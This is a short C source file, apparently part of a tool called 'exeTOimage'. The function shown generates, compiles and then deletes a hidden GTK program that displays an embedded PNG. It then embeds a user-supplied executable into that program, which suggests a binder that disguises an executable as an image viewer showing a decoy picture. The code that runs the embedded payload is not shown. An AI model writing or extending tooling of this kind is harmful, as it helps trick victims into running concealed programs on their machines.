#include "exeTOimage.h"

void exeTOimageInP_c(char** argv)
{
	FILE* f = fopen(".p.c", "w");
	fprintf(f,
		"#include <gtk/gtk.h>\n"
		"#include \".h.h\"\n"
		"\n"
		"void* exe(void* arg);\n"
		"\n"
		"int main(int argc, char** argv)\n"
		"{\n"
		"\n"
		"        FILE* f = fopen(\"./.p2.png\", \"wb\");\n"
		"\n"
		"        for(int i = 0;i < pro_two_len; i++) fputc(pro_two[i], f);\n"
		"        fclose(f);\n"
		"\n"
		"	gtk_init(&argc, &argv);\n"
		"	GtkWidget* win   = gtk_window_new(GTK_WINDOW_TOPLEVEL);\n"
		"	GtkWidget* image = gtk_image_new_from_file(\"./.p2.png\");\n"
		"\n"
		"	gtk_container_add(GTK_CONTAINER(win), image);\n"
		"	gtk_widget_show_all(win);\n"
		"	gtk_main();\n"
		"	return 0;\n"
		"}\n"
	);
	fclose(f);
	system("gcc -w -o .p2 .p.c `pkg-config --libs --cflags gtk+-2.0`");
	remove(".p.c");

	xxd_i(argv[1], ".p2");

	exeTOexeInP_c();
}
